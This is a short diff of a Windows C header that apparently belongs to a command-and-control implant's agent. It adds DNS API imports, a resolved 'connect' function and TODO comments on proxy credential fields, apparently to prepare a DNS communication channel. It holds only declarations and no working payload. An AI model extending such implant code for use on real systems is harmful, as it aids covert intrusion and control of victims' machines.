@@ -5,6 +5,7 @@
 #include <winsock2.h>
 #include <ntstatus.h>
 #include <aclapi.h>
+#include <windns.h>
 
 #include <Common/Native.h>
 #include <Common/Macros.h>
@@ -94,9 +95,9 @@ typedef struct
 
             struct {
                 BOOL   Enabled;
-                LPWSTR Url;
-                LPWSTR Username;
-                LPWSTR Password;
+                LPWSTR Url;      /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
+                LPWSTR Username; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
+                LPWSTR Password; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
             } Proxy;
 #endif
 
@@ -341,7 +342,10 @@ typedef struct
         WIN_FUNC( closesocket )
         WIN_FUNC( recv )
         WIN_FUNC( send )
+        WIN_FUNC( connect )
 
+        /* dnsapi.dll */
+        WIN_FUNC( DnsQuery_A )
     } Win32;
 
     struct
@@ -398,6 +402,7 @@ typedef struct
         PVOID Wkscli;
         PVOID NetApi32;
         PVOID Ws2_32;
+        PVOID Dnsapi;
 
 #ifdef TRANSPORT_HTTP
         PVOID WinHttp;
